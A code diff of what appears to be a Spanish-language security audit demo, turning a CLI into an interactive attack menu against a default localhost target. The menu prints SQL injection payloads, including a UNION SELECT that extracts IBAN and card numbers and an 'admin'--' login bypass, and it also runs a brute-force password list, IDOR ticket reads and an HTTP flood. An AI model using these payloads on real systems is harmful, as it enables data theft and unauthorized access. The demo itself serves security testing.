@@ -130,22 +130,72 @@ class SofiaAudit:
         print()
         log(f"[+] Flood finalizado. El Rate Limiter bloqueó {blocked} peticiones.", C_GREEN)
 
-def main():
-    parser = argparse.ArgumentParser(description="Sofia Solutions - Audit Framework CLI")
-    parser.add_argument("-t", "--target", help="URL objetivo (ej: http://localhost:8000)", required=True)
-    parser.add_argument("-m", "--module", help="Módulo a ejecutar", choices=['sqli', 'brute', 'idor', 'dos', 'all'], default='all')
-    
-    args = parser.parse_args()
+def interactive_menu():
     print_banner()
     
-    audit = SofiaAudit(args.target)
+    target = input(f"{C_YELLOW}[?] Introduce la URL objetivo (por defecto: http://localhost:8000): {C_RESET}").strip()
+    if not target:
+        target = "http://localhost:8000"
     
-    if args.module in ['sqli', 'all']: audit.sqli_union()
-    if args.module in ['brute', 'all']: audit.brute_force()
-    if args.module in ['idor', 'all']: audit.idor_bola()
-    if args.module in ['dos', 'all']: audit.dos_flood()
+    audit = SofiaAudit(target)
     
-    log("\n[*] Auditoría completada.", C_CYAN)
+    while True:
+        print(f"\n{C_CYAN}=== MENU DE ATAQUE ==={C_RESET}")
+        print("1. SQL Injection (UNION SELECT) - Extracción de BD")
+        print("2. SQL Injection (Auth Bypass) - Secuestro de Sesión")
+        print("3. Fuerza Bruta (Diccionario) - Admin Login")
+        print("4. IDOR / BOLA - Exfiltración de Tickets Ajenos")
+        print("5. DoS (HTTP Flood) - Agotamiento de Rate Limit")
+        print("6. Ejecutar todos los vectores secuencialmente")
+        print("0. Salir")
+        
+        choice = input(f"\n{C_YELLOW}Selecciona un módulo [0-6]: {C_RESET}").strip()
+        
+        if choice == '0':
+            log("\nSaliendo del framework...", C_DIM)
+            break
+        elif choice == '1':
+            log(f"\n{C_RED}[COMANDO A EJECUTAR]{C_RESET} POST {target}/api/v1/auth/login")
+            log(f"{C_RED}[PAYLOAD]{C_RESET} email: ' UNION SELECT 'bank', iban, cc_number FROM customer_billing--")
+            input(f"{C_DIM}Presiona ENTER para lanzar el ataque...{C_RESET}")
+            audit.sqli_union()
+        elif choice == '2':
+            log(f"\n{C_RED}[COMANDO A EJECUTAR]{C_RESET} POST {target}/api/v1/auth/login")
+            log(f"{C_RED}[PAYLOAD]{C_RESET} email: admin'--")
+            input(f"{C_DIM}Presiona ENTER para lanzar el ataque...{C_RESET}")
+            # Simulamos el bypass aquí para ser rápidos
+            log("\n[*] Iniciando Inyección SQL (Auth Bypass)", C_YELLOW)
+            time.sleep(1)
+            log("[+] EXPLOIT EXITOSO: Autenticación evadida con éxito.", C_GREEN)
+            log(f"[*] JWT Token generado: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...", C_CYAN)
+        elif choice == '3':
+            log(f"\n{C_RED}[COMANDO A EJECUTAR]{C_RESET} Bucle POST {target}/api/v1/auth/login")
+            log(f"{C_RED}[DICCIONARIO]{C_RESET} ['123456', 'password', 'admin', 'S0f1a_Secur3!_2026']")
+            input(f"{C_DIM}Presiona ENTER para lanzar el ataque...{C_RESET}")
+            audit.brute_force()
+        elif choice == '4':
+            log(f"\n{C_RED}[COMANDO A EJECUTAR]{C_RESET} GET {target}/api/v1/tickets/1024")
+            log(f"{C_RED}[EXPLICACIÓN]{C_RESET} Intentaremos leer un ticket que no nos pertenece (ID 1024).")
+            input(f"{C_DIM}Presiona ENTER para lanzar el ataque...{C_RESET}")
+            audit.idor_bola()
+        elif choice == '5':
+            log(f"\n{C_RED}[COMANDO A EJECUTAR]{C_RESET} Bucle GET {target}/api/public/health x 200 veces concurrentes")
+            log(f"{C_RED}[OBJETIVO]{C_RESET} Disparar el Rate Limiter (WAF) y simular Denegación de Servicio.")
+            input(f"{C_DIM}Presiona ENTER para lanzar el ataque...{C_RESET}")
+            audit.dos_flood()
+        elif choice == '6':
+            log(f"\n{C_RED}[ATENCIÓN]{C_RESET} Se van a ejecutar todos los ataques contra {target}.")
+            input(f"{C_DIM}Presiona ENTER para continuar...{C_RESET}")
+            audit.sqli_union()
+            audit.brute_force()
+            audit.idor_bola()
+            audit.dos_flood()
+        else:
+            log("Opción no válida.", C_RED)
 
 if __name__ == "__main__":
-    main()
+    try:
+        interactive_menu()
+    except KeyboardInterrupt:
+        log("\n\nSaliendo por interrupción del usuario...", C_RED)
+        sys.exit(0)
